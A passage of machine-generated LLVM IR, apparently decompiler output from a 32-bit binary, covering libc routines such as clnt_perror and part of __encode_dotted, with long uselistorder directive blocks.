  %v0_8067e5a = phi i32 [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067d70, %dec_label_pc_8067d1d ], [ %v2_8067e0a, %dec_label_pc_8067df6 ], [ %storemerge, %dec_label_pc_8067e57 ]
  %v1_8067e5a = inttoptr i32 %v0_8067e5a to i8*
  store i8 10, i8* %v1_8067e5a, align 1
  store i32 %v3_8067d0c, i32* %eax.global-to-local, align 4
  %v0_8067e5f = load i32, i32* @esi, align 4
  %v1_8067e5f = add i32 %v0_8067e5f, 1
  %v2_8067e5f = inttoptr i32 %v1_8067e5f to i8*
  store i8 0, i8* %v2_8067e5f, align 1
  %v0_8067e6d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8067e63

dec_label_pc_8067e63:                             ; preds = %entry, %dec_label_pc_8067e5a
  %v0_8067e6d = phi i32 [ 0, %entry ], [ %v0_8067e6d.pre, %dec_label_pc_8067e5a ]
  %v2_8067e69 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8067e69, i32* @ebx, align 4
  store i32 %v0_8067cfd, i32* @esi, align 4
  store i32 %v0_8067cfc, i32* @edi, align 4
  store i32 %v0_8067cfb, i32* @ebp, align 4
  ret i32 %v0_8067e6d

; uselistorder directives
  uselistorder i32 %v1_8067dcf, { 1, 0, 2 }
  uselistorder i32 %v1_8067dc6, { 1, 0 }
  uselistorder i32 %v0_8067dd739, { 1, 0 }
  uselistorder i32 %v3_8067d0c, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 7, 0, 1, 2, 3, 4, 8, 9, 10, 11, 12 }
  uselistorder i8 10, { 23, 22, 0, 1, 2, 20, 3, 4, 5, 6, 7, 21, 19, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32 (i32, i32, i32)* @__GI___glibc_strerror_r, { 2, 1, 0 }
  uselistorder i32 1024, { 12, 13, 14, 15, 66, 2, 72, 16, 71, 17, 65, 20, 19, 73, 18, 10, 11, 3, 4, 5, 6, 7, 8, 9, 61, 0, 1, 67, 41, 42, 43, 39, 40, 44, 37, 38, 45, 35, 36, 46, 33, 34, 47, 31, 32, 48, 29, 30, 49, 27, 28, 50, 25, 26, 51, 23, 24, 52, 53, 54, 55, 56, 62, 63, 64, 57, 68, 21, 69, 70, 58, 59, 60, 22 }
  uselistorder i32 17, { 19, 21, 0, 22, 3, 1, 20, 8, 18, 4, 5, 2, 9, 10, 11, 12, 13, 24, 7, 23, 14, 15, 16, 6, 17 }
  uselistorder i32 16, { 107, 330, 331, 279, 278, 0, 280, 281, 168, 332, 41, 340, 42, 82, 83, 43, 44, 166, 333, 17, 18, 157, 158, 159, 160, 282, 341, 342, 161, 19, 20, 21, 334, 1, 370, 371, 372, 3, 2, 289, 290, 291, 292, 293, 294, 301, 295, 296, 297, 298, 299, 300, 302, 303, 304, 305, 306, 307, 308, 310, 311, 312, 162, 163, 164, 165, 45, 61, 132, 133, 335, 167, 65, 84, 104, 169, 170, 171, 336, 172, 173, 174, 175, 176, 337, 134, 39, 105, 35, 135, 136, 66, 137, 138, 67, 139, 140, 141, 142, 143, 144, 145, 338, 339, 46, 110, 111, 47, 177, 178, 179, 180, 181, 182, 373, 283, 284, 285, 286, 343, 344, 345, 346, 347, 348, 349, 350, 377, 48, 49, 108, 85, 268, 109, 183, 328, 184, 385, 374, 14, 40, 375, 5, 4, 376, 7, 6, 86, 185, 87, 186, 8, 187, 188, 62, 189, 190, 191, 9, 313, 314, 63, 50, 22, 309, 51, 146, 147, 148, 52, 81, 53, 151, 149, 150, 37, 155, 152, 153, 154, 36, 156, 54, 396, 315, 316, 317, 318, 319, 320, 287, 288, 321, 322, 323, 324, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 88, 366, 367, 368, 369, 378, 379, 380, 325, 38, 23, 207, 192, 193, 392, 393, 394, 395, 194, 195, 196, 197, 381, 382, 383, 384, 389, 390, 391, 10, 198, 199, 329, 59, 60, 200, 24, 388, 25, 11, 201, 26, 202, 203, 204, 205, 27, 206, 28, 386, 397, 387, 29, 208, 209, 114, 112, 113, 115, 30, 116, 31, 117, 118, 12, 32, 119, 120, 33, 210, 34, 211, 89, 212, 213, 55, 214, 68, 215, 57, 216, 56, 217, 69, 218, 90, 219, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 220, 221, 91, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 92, 232, 233, 234, 15, 235, 236, 237, 238, 239, 93, 94, 240, 95, 241, 64, 96, 242, 70, 71, 72, 243, 244, 245, 73, 246, 247, 248, 74, 249, 250, 75, 251, 97, 252, 16, 253, 76, 254, 98, 99, 100, 101, 255, 256, 257, 258, 77, 259, 260, 261, 262, 78, 263, 264, 265, 266, 79, 267, 269, 270, 271, 272, 273, 13, 80, 274, 275, 276, 277, 58, 326, 102, 327, 106, 103 }
  uselistorder i32 15, { 8, 3, 16, 10, 2, 17, 9, 20, 22, 5, 19, 4, 11, 12, 13, 14, 15, 21, 0, 1, 18, 6, 7 }
  uselistorder i32 14, { 5, 0, 7, 8, 9, 10, 2, 3, 6, 4, 1 }
  uselistorder i32 13, { 8, 2, 0, 10, 1, 11, 9, 3, 5, 7, 6, 4 }
  uselistorder i32 12, { 68, 0, 278, 279, 261, 262, 263, 1, 264, 37, 134, 38, 39, 282, 95, 126, 127, 128, 129, 265, 130, 2, 304, 305, 283, 306, 307, 308, 309, 310, 311, 60, 58, 18, 59, 19, 20, 21, 22, 23, 24, 25, 3, 131, 132, 133, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 284, 16, 280, 281, 135, 136, 139, 40, 140, 137, 138, 141, 26, 27, 142, 143, 41, 144, 42, 145, 146, 43, 147, 44, 148, 45, 149, 46, 150, 151, 152, 285, 153, 70, 154, 112, 28, 29, 114, 30, 31, 32, 115, 33, 34, 113, 286, 287, 288, 61, 71, 72, 53, 47, 155, 156, 157, 266, 289, 290, 291, 292, 293, 294, 295, 296, 4, 50, 51, 297, 298, 299, 336, 69, 158, 275, 276, 159, 160, 347, 348, 349, 350, 351, 352, 353, 339, 340, 341, 342, 343, 344, 345, 346, 312, 331, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 62, 330, 63, 161, 5, 54, 162, 163, 164, 267, 268, 269, 270, 165, 6, 52, 236, 116, 117, 118, 119, 120, 121, 122, 123, 124, 365, 271, 300, 7, 8, 301, 302, 35, 36, 303, 9, 272, 273, 64, 66, 174, 48, 166, 364, 167, 337, 361, 168, 277, 335, 169, 10, 11, 12, 338, 13, 333, 334, 332, 354, 355, 356, 170, 171, 172, 366, 65, 67, 357, 358, 359, 360, 362, 17, 363, 173, 175, 125, 176, 177, 49, 73, 74, 75, 76, 15, 14, 179, 178, 180, 181, 182, 183, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 55, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 56, 229, 230, 231, 232, 233, 234, 235, 57, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 274 }
  uselistorder i32 11, { 18, 25, 26, 8, 32, 9, 20, 0, 4, 7, 19, 33, 10, 2, 22, 27, 28, 29, 30, 11, 31, 3, 12, 5, 23, 24, 6, 21, 16, 17, 15, 14, 13, 1 }
  uselistorder i32 10, { 55, 37, 0, 84, 85, 86, 87, 88, 89, 38, 1, 90, 57, 59, 31, 23, 24, 39, 2, 56, 82, 25, 91, 40, 3, 67, 68, 41, 54, 32, 4, 20, 5, 26, 42, 6, 21, 27, 22, 60, 8, 9, 10, 61, 7, 62, 63, 11, 64, 65, 12, 66, 18, 19, 28, 29, 17, 13, 14, 15, 30, 35, 43, 47, 58, 48, 46, 45, 44, 36, 33, 49, 50, 34, 16, 69, 70, 51, 71, 72, 73, 74, 75, 76, 77, 52, 78, 79, 80, 81, 83, 53 }
  uselistorder i32 9, { 17, 30, 31, 32, 33, 34, 0, 1, 19, 4, 35, 36, 3, 18, 2, 6, 5, 20, 37, 38, 39, 40, 41, 21, 7, 8, 9, 10, 11, 15, 14, 13, 22, 23, 24, 25, 26, 27, 12, 16, 28, 29 }
  uselistorder i32 7, { 14, 29, 30, 0, 1, 27, 21, 15, 6, 2, 7, 22, 23, 24, 25, 26, 4, 16, 32, 33, 34, 35, 36, 8, 17, 9, 10, 28, 11, 18, 19, 20, 3, 12, 5, 31, 13 }
  uselistorder i32 6, { 26, 52, 53, 6, 34, 0, 35, 1, 32, 10, 13, 54, 7, 27, 14, 15, 11, 56, 2, 3, 4, 33, 55, 8, 9, 5, 16, 17, 18, 28, 29, 30, 31, 19, 20, 12, 36, 21, 37, 38, 39, 22, 40, 41, 23, 42, 43, 44, 45, 46, 47, 24, 48, 25, 49, 50, 51 }
  uselistorder i32 5, { 35, 49, 38, 46, 47, 48, 14, 15, 50, 43, 44, 19, 36, 16, 41, 42, 20, 17, 37, 24, 25, 45, 26, 54, 55, 27, 22, 0, 1, 2, 4, 18, 51, 39, 52, 53, 28, 29, 30, 3, 40, 5, 6, 7, 23, 31, 32, 33, 34, 8, 9, 21, 10, 11, 12, 13 }
  uselistorder i32 3, { 105, 128, 129, 130, 131, 132, 133, 31, 26, 27, 139, 0, 119, 120, 20, 134, 44, 2, 1, 3, 32, 121, 106, 45, 114, 115, 137, 138, 40, 46, 22, 47, 104, 41, 54, 107, 4, 55, 56, 57, 58, 59, 60, 140, 33, 34, 61, 122, 123, 124, 48, 18, 19, 17, 49, 5, 23, 6, 50, 7, 30, 116, 117, 24, 118, 28, 29, 8, 9, 10, 11, 12, 51, 135, 52, 136, 35, 36, 13, 14, 62, 37, 38, 63, 15, 64, 39, 108, 65, 21, 66, 42, 67, 68, 69, 70, 71, 111, 112, 113, 53, 72, 73, 125, 126, 16, 74, 75, 127, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 109, 88, 89, 90, 43, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 110, 102, 103, 25 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 8, 3, 4, 5, 6, 7, 9, 10, 11, 2, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 21, 22 }
  uselistorder i32 (i32)* @__GI_clnt_sperrno, { 0, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @sprintf, { 21, 23, 20, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 8, { 31, 94, 90, 187, 164, 186, 338, 337, 339, 0, 1, 340, 341, 342, 343, 344, 345, 10, 346, 177, 2, 165, 166, 167, 11, 168, 169, 347, 348, 349, 350, 58, 351, 378, 408, 409, 410, 411, 412, 413, 414, 415, 69, 32, 33, 34, 35, 70, 36, 37, 71, 72, 38, 73, 39, 74, 75, 170, 171, 172, 173, 92, 174, 175, 176, 198, 368, 369, 178, 179, 180, 181, 182, 12, 183, 184, 185, 188, 417, 189, 40, 41, 190, 416, 191, 192, 193, 194, 195, 196, 197, 370, 53, 199, 200, 371, 372, 201, 202, 203, 204, 95, 205, 206, 373, 132, 42, 43, 133, 44, 45, 76, 46, 134, 47, 48, 135, 136, 374, 375, 376, 377, 96, 59, 137, 138, 139, 207, 208, 352, 379, 380, 381, 382, 383, 384, 61, 60, 385, 386, 387, 388, 452, 453, 454, 495, 54, 496, 55, 91, 455, 49, 209, 364, 365, 210, 211, 474, 475, 476, 477, 478, 479, 480, 13, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 14, 418, 419, 420, 421, 422, 423, 78, 15, 79, 16, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 77, 441, 442, 17, 443, 444, 445, 446, 18, 447, 212, 50, 3, 4, 213, 214, 5, 353, 354, 6, 7, 21, 318, 319, 140, 141, 143, 144, 142, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 56, 19, 160, 161, 493, 389, 355, 356, 357, 8, 9, 93, 390, 391, 392, 393, 395, 396, 397, 394, 398, 399, 400, 401, 51, 52, 402, 403, 404, 405, 406, 407, 456, 457, 458, 358, 359, 360, 361, 252, 253, 362, 488, 242, 311, 57, 215, 216, 217, 218, 219, 482, 220, 489, 490, 491, 492, 221, 222, 223, 224, 459, 460, 461, 486, 487, 367, 225, 483, 162, 226, 227, 451, 229, 230, 163, 448, 449, 450, 366, 228, 231, 463, 481, 232, 233, 234, 235, 236, 312, 494, 237, 238, 484, 485, 462, 239, 240, 241, 244, 245, 246, 247, 243, 248, 97, 98, 99, 100, 101, 249, 250, 80, 81, 82, 83, 84, 85, 251, 62, 254, 63, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 86, 255, 256, 64, 65, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 29, 66, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 30, 67, 281, 282, 283, 284, 285, 286, 68, 287, 20, 288, 289, 290, 291, 87, 292, 293, 294, 295, 296, 297, 22, 298, 299, 300, 301, 302, 23, 303, 304, 305, 306, 307, 308, 309, 310, 313, 314, 24, 315, 316, 317, 88, 320, 321, 322, 25, 323, 324, 325, 326, 26, 327, 328, 329, 27, 330, 331, 332, 333, 28, 334, 335, 336, 89, 363 }
  uselistorder i32 4, { 204, 395, 333, 740, 741, 679, 680, 681, 675, 673, 674, 676, 677, 678, 0, 29, 682, 683, 684, 685, 686, 687, 688, 689, 690, 86, 129, 396, 397, 742, 743, 117, 380, 286, 30, 31, 1, 555, 32, 33, 34, 334, 335, 336, 337, 338, 339, 36, 35, 340, 341, 342, 343, 38, 37, 39, 40, 41, 766, 767, 768, 769, 770, 771, 691, 692, 344, 345, 749, 750, 805, 87, 806, 807, 808, 809, 810, 811, 812, 42, 814, 813, 693, 694, 695, 696, 697, 698, 138, 699, 702, 703, 704, 152, 88, 705, 706, 707, 708, 89, 90, 91, 153, 92, 93, 154, 94, 710, 95, 711, 155, 96, 156, 157, 346, 347, 348, 349, 350, 351, 352, 353, 287, 2, 288, 3, 289, 4, 290, 5, 751, 354, 80, 744, 745, 746, 747, 118, 43, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 755, 756, 757, 377, 378, 379, 752, 753, 754, 381, 382, 383, 384, 385, 386, 387, 388, 401, 389, 390, 391, 44, 392, 393, 394, 398, 399, 816, 400, 402, 403, 97, 98, 404, 815, 748, 405, 406, 407, 408, 758, 759, 409, 410, 411, 412, 413, 414, 205, 415, 760, 761, 762, 99, 100, 291, 292, 293, 6, 294, 101, 295, 102, 158, 103, 104, 296, 105, 297, 298, 299, 300, 763, 764, 119, 196, 765, 215, 214, 216, 217, 218, 130, 416, 417, 418, 419, 420, 421, 817, 45, 700, 701, 159, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 131, 782, 844, 783, 847, 848, 887, 888, 889, 849, 120, 206, 643, 644, 645, 646, 647, 648, 850, 46, 422, 423, 424, 425, 160, 727, 728, 729, 139, 730, 731, 732, 733, 426, 427, 428, 429, 430, 140, 47, 431, 432, 857, 882, 860, 867, 868, 869, 870, 871, 48, 861, 862, 863, 864, 865, 7, 866, 858, 859, 818, 49, 819, 126, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 81, 840, 841, 127, 842, 50, 883, 881, 649, 650, 161, 433, 434, 435, 436, 437, 8, 9, 106, 438, 10, 712, 713, 121, 714, 715, 716, 717, 11, 51, 12, 439, 440, 441, 107, 108, 109, 709, 122, 13, 606, 601, 602, 603, 604, 605, 128, 301, 302, 303, 304, 305, 306, 307, 308, 309, 123, 310, 311, 312, 313, 316, 314, 315, 15, 318, 317, 14, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 886, 52, 718, 475, 784, 53, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 110, 111, 208, 162, 802, 803, 804, 719, 720, 132, 197, 721, 482, 483, 484, 133, 134, 16, 485, 486, 722, 723, 461, 595, 853, 854, 442, 443, 444, 445, 446, 163, 447, 873, 874, 876, 875, 877, 448, 449, 846, 845, 329, 54, 55, 56, 884, 885, 450, 451, 452, 851, 852, 880, 734, 736, 17, 18, 19, 735, 453, 843, 872, 124, 454, 455, 125, 456, 457, 458, 20, 21, 737, 22, 462, 459, 878, 879, 460, 855, 856, 330, 331, 23, 463, 464, 738, 465, 466, 219, 220, 57, 221, 222, 223, 224, 225, 226, 227, 228, 229, 58, 230, 207, 24, 467, 468, 469, 25, 26, 470, 59, 471, 60, 61, 62, 63, 472, 164, 198, 165, 199, 166, 200, 64, 473, 474, 167, 168, 476, 477, 478, 27, 169, 170, 65, 66, 479, 171, 480, 481, 487, 172, 488, 173, 489, 490, 491, 174, 175, 492, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 242, 28, 241, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 201, 276, 277, 278, 279, 280, 281, 282, 283, 112, 284, 113, 285, 493, 494, 495, 496, 176, 497, 177, 67, 68, 498, 499, 500, 501, 502, 503, 504, 202, 505, 506, 507, 508, 509, 510, 511, 135, 512, 513, 514, 515, 516, 517, 518, 203, 519, 520, 521, 522, 523, 524, 525, 136, 526, 527, 528, 209, 529, 530, 178, 531, 532, 533, 534, 535, 536, 537, 137, 538, 539, 540, 141, 142, 179, 180, 181, 182, 183, 184, 541, 185, 542, 143, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 69, 70, 659, 71, 554, 556, 186, 187, 188, 189, 190, 191, 192, 557, 558, 559, 560, 561, 562, 563, 564, 565, 72, 114, 566, 82, 567, 568, 569, 210, 571, 570, 144, 572, 573, 574, 575, 576, 577, 73, 115, 578, 83, 579, 580, 581, 211, 583, 582, 145, 584, 585, 586, 587, 588, 589, 590, 74, 591, 84, 592, 146, 593, 594, 596, 597, 75, 116, 598, 85, 599, 147, 600, 607, 608, 609, 610, 611, 612, 613, 614, 615, 212, 617, 616, 148, 618, 619, 620, 621, 76, 622, 623, 624, 625, 626, 627, 628, 149, 629, 630, 631, 632, 633, 634, 635, 636, 213, 638, 637, 150, 639, 640, 641, 642, 151, 651, 652, 653, 654, 655, 656, 657, 658, 660, 661, 662, 663, 664, 665, 666, 667, 668, 193, 669, 670, 671, 194, 672, 724, 195, 725, 726, 77, 78, 739, 79, 332 }
  uselistorder i32* @ebp, { 55, 56, 57, 31, 4, 32, 33, 34, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 48, 5, 49, 50, 51, 428, 429, 430, 465, 466, 431, 432, 433, 467, 468, 469, 470, 311, 312, 318, 319, 320, 321, 331, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 413, 414, 415, 416, 417, 418, 66, 67, 52, 53, 54, 58, 59, 60, 471, 472, 473, 61, 62, 63, 6, 64, 65, 26, 27, 419, 420, 421, 422, 423, 424, 425, 426, 427, 434, 435, 436, 437, 438, 439, 488, 489, 7, 490, 491, 492, 8, 493, 494, 517, 268, 269, 270, 68, 69, 70, 71, 72, 397, 398, 495, 501, 502, 503, 504, 496, 497, 498, 499, 500, 474, 475, 476, 477, 478, 479, 480, 481, 486, 482, 483, 484, 485, 1, 487, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 95, 96, 97, 98, 99, 100, 101, 102, 2, 103, 322, 323, 324, 329, 325, 326, 327, 328, 330, 256, 257, 258, 259, 260, 10, 9, 261, 440, 11, 441, 442, 443, 444, 445, 446, 313, 0, 314, 315, 316, 317, 343, 344, 345, 346, 347, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 3, 464, 28, 29, 30, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 406, 407, 408, 149, 377, 378, 379, 104, 105, 106, 107, 108, 109, 110, 121, 250, 505, 506, 507, 12, 508, 509, 510, 511, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 512, 513, 514, 515, 516, 122, 123, 124, 402, 403, 404, 405, 16, 17, 18, 19, 20, 21, 22, 23, 24, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 13, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 25, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 226, 227, 224, 225, 228, 229, 230, 231, 232, 233, 234, 235, 236, 273, 274, 275, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 251, 252, 253, 254, 255, 262, 263, 264, 265, 266, 267, 271, 272, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 380, 381, 382, 383, 384, 385, 386, 387, 388, 14, 389, 390, 391, 392, 15, 393, 394, 395, 396, 399, 400, 401, 409, 410, 411, 412 }
  uselistorder label %dec_label_pc_8067e63, { 1, 0 }
  uselistorder label %dec_label_pc_8067e5a, { 14, 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_8067e57, { 1, 0 }
  uselistorder label %dec_label_pc_8067e4f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8067dd7, { 1, 0 }
  uselistorder label %dec_label_pc_8067dc6, { 1, 0 }
}

define i32 @clnt_perror(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8067e6e = load i32, i32* @ebx, align 4
  %v0_8067e76 = load i32, i32* @global_var_80753f0, align 16
  store i32 %v0_8067e76, i32* @ebx, align 4
  %v2_8067e80 = call i32 @__GI_clnt_sperror(i32 %arg1, i32 %arg2)
  %v0_8067e85 = load i32, i32* @ebx, align 4
  store i32 %v0_8067e6e, i32* @ebx, align 4
  %v2_8067e91 = call i32 @__GI_fputs(i32 %v2_8067e80, i32 %v0_8067e85)
  ret i32 %v2_8067e91

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fputs, { 6, 5, 4, 3, 1, 2, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8067e99 = load i32, i32* @edi, align 4
  %v0_8067e9a = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_8067ea1 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8067ea1, i32* @edi, align 4
  %v1_8067f004 = icmp eq i8* %arg1, null
  br i1 %v1_8067f004, label %dec_label_pc_8067f09, label %dec_label_pc_8067f04.lr.ph

dec_label_pc_8067f04.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8067f04

dec_label_pc_8067ea7:                             ; preds = %dec_label_pc_8067f04
  %v5_8067eac = call i32 @__GI_strchr(i8* %v1_8067f04, i32 46)
  %v1_8067eb4 = icmp eq i32 %v5_8067eac, 0
  br i1 %v1_8067eb4, label %dec_label_pc_8067ec0, label %dec_label_pc_8067eba

dec_label_pc_8067eba:                             ; preds = %dec_label_pc_8067ea7
  %v1_8067ebc = load i32, i32* @edi, align 4
  %v2_8067ebc = sub i32 %v5_8067eac, %v1_8067ebc
  br label %dec_label_pc_8067ece

dec_label_pc_8067ec0:                             ; preds = %dec_label_pc_8067ea7
  %v0_8067ec3 = load i32, i32* @edi, align 4
  %v5_8067ec3 = inttoptr i32 %v0_8067ec3 to i8*
  %v3_8067ec4 = call i32 @strlen(i8* %v5_8067ec3)
  br label %dec_label_pc_8067ece

dec_label_pc_8067ece:                             ; preds = %dec_label_pc_8067eba, %dec_label_pc_8067ec0
  %v0_8067ee1 = phi i32 [ %v3_8067ec4, %dec_label_pc_8067ec0 ], [ %v2_8067ebc, %dec_label_pc_8067eba ]
  store i32 %v0_8067ee1, i32* @esi, align 4
  %v1_8067ece = icmp eq i32 %v0_8067ee1, 0
  %v3_8067ece = trunc i32 %v0_8067ee1 to i8
  br i1 %v1_8067ece, label %dec_label_pc_8067f1d, label %dec_label_pc_8067ed2

dec_label_pc_8067ed2:                             ; preds = %dec_label_pc_8067ece
  %v1_8067ed6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067ed6 = sub i32 %arg3, %v1_8067ed6
  %v1_8067ed8 = add i32 %v2_8067ed6, -1
  %v7_8067ed9 = icmp ult i32 %v0_8067ee1, %v1_8067ed8
  %v1_8067edb = icmp eq i1 %v7_8067ed9, false
  br i1 %v1_8067edb, label %dec_label_pc_8067f1d, label %dec_label_pc_8067edd

dec_label_pc_8067edd:                             ; preds = %dec_label_pc_8067ed2
  store i32 %arg2, i32* @edx, align 4
  %v4_8067ee3 = add i32 %v1_8067ed6, %arg2
  %v5_8067ee3 = inttoptr i32 %v4_8067ee3 to i8*
  store i8 %v3_8067ece, i8* %v5_8067ee3, align 1
  %v0_8067ee6 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067ee6 = add i32 %v0_8067ee6, 1
  %v0_8067ee8 = load i32, i32* @edx, align 4
  %v0_8067eea = load i32, i32* @esi, align 4
  %v2_8067eeb = add i32 %v1_8067ee6, %v0_8067ee8
  %v0_8067eed = load i32, i32* @edi, align 4
  %v2_8067eee = add i32 %v0_8067eea, %v1_8067ee6
  store i32 %v2_8067eee, i32* %ebx.global-to-local, align 4
  %tmp29 = inttoptr i32 %v2_8067eeb to i16*
  %v7_8067ef1 = call i32 @memcpy(i16* %tmp29, i32 %v0_8067eed, i32 %v0_8067eea)
  %v1_8067efd = add i32 %v5_8067eac, 1
  br i1 %v1_8067eb4, label %dec_label_pc_8067f09, label %dec_label_pc_8067f00

dec_label_pc_8067f00:                             ; preds = %dec_label_pc_8067edd
  store i32 %v1_8067efd, i32* @edi, align 4
  %v1_8067f00 = icmp eq i32 %v1_8067efd, 0
  br i1 %v1_8067f00, label %dec_label_pc_8067f09, label %dec_label_pc_8067f04

dec_label_pc_8067f04:                             ; preds = %dec_label_pc_8067f04.lr.ph, %dec_label_pc_8067f00
  %v0_8067eab = phi i32 [ %v4_8067ea1, %dec_label_pc_8067f04.lr.ph ], [ %v1_8067efd, %dec_label_pc_8067f00 ]
  %v1_8067f04 = inttoptr i32 %v0_8067eab to i8*
  %v2_8067f04 = load i8, i8* %v1_8067f04, align 1
  %v3_8067f04 = icmp eq i8 %v2_8067f04, 0
  %v1_8067f07 = icmp eq i1 %v3_8067f04, false
  br i1 %v1_8067f07, label %dec_label_pc_8067ea7, label %dec_label_pc_8067f09

dec_label_pc_8067f09:                             ; preds = %dec_label_pc_8067f00, %dec_label_pc_8067f04, %dec_label_pc_8067edd, %entry
  %tmp30 = icmp slt i32 %arg3, 1
  br i1 %tmp30, label %dec_label_pc_8067f1d, label %dec_label_pc_8067f10

dec_label_pc_8067f10:                             ; preds = %dec_label_pc_8067f09
  %v1_8067f14 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8067f14 = add i32 %v1_8067f14, %arg2
  %v3_8067f14 = inttoptr i32 %v2_8067f14 to i8*
  store i8 0, i8* %v3_8067f14, align 1
  %v0_8067f18 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8067f18 = add i32 %v0_8067f18, 1
  br label %dec_label_pc_8067f20

dec_label_pc_8067f1d:                             ; preds = %dec_label_pc_8067ed2, %dec_label_pc_8067ece, %dec_label_pc_8067f09
  br label %dec_label_pc_8067f20

dec_label_pc_8067f20:                             ; preds = %dec_label_pc_8067f10, %dec_label_pc_8067f1d
  %storemerge2 = phi i32 [ %v1_8067f18, %dec_label_pc_8067f10 ], [ -1, %dec_label_pc_8067f1d ]
